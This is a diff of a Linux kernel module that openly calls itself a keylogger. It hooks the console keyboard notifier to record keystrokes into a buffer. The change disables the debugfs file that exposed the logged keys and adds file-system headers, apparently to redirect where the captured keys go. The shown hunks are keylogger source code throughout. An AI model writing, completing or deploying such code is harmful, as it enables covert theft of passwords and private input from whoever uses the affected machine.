@@ -6,14 +6,20 @@
 #include <linux/debugfs.h>
 #include <linux/input.h>
 
+#include <linux/fs.h>
+#include <asm/segment.h>
+#include <asm/uaccess.h>
+#include <linux/buffer_head.h>
+
 #define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
 #define CHUNK_LEN 12 /* Encoded 'keycode shift' chunk length */
 
 // *********************************************************************
 // function prototypes
 // *********************************************************************
-static struct dentry *file;
-static struct dentry *subdir;
+//static struct dentry *file;
+//static struct dentry *subdir;
+//static struct file *file;
 
 static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *offset);
 
@@ -67,10 +73,10 @@ static const char *us_keymap[][2] = {
 static size_t buf_pos;
 static char keys_buf[BUF_LEN];
 
-const struct file_operations keys_fops = {
+/*const struct file_operations keys_fops = {
 	.owner = THIS_MODULE,
 	.read = keys_read,
-};
+};*/
 
 // *********************************************************************
 // functions definitions
@@ -147,8 +153,8 @@ int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void *_para
 ///dev/input/event2
 static int run_keylogger(void)
 {
-  printk("starting keylogger\n");
-	subdir = debugfs_create_dir("lkmr", NULL);
+
+	/*subdir = debugfs_create_dir("lkmr", NULL);
 	if (IS_ERR(subdir))
 		return PTR_ERR(subdir);
 	if (!subdir)
@@ -156,13 +162,14 @@ static int run_keylogger(void)
 		printk("Keylogger: failed to create folder\n");
 		return -ENOENT;
 	}
+	subdir = NULL;
 
 	file = debugfs_create_file("keys", 0400, subdir, NULL, &keys_fops);
 	if (!file) {
 		printk("Keylogger: failed to create file\n");
 		debugfs_remove_recursive(subdir);
 		return -ENOENT;
-	}
+	}*/
 
 	/*
 	 * Add to the list of console keyboard event
@@ -170,13 +177,13 @@ static int run_keylogger(void)
 	 * called when an event occurs.
 	 */
 	register_keyboard_notifier(&keysniffer_blk);
-  printk("Keylogger working\n");
+  printk("Keylogger: working\n");
 	return 0;
 }
 
 static int exit_keylogger(void)
 {
 	unregister_keyboard_notifier(&keysniffer_blk);
-	debugfs_remove_recursive(subdir);
+	//debugfs_remove_recursive(subdir);
   return 0;
 }
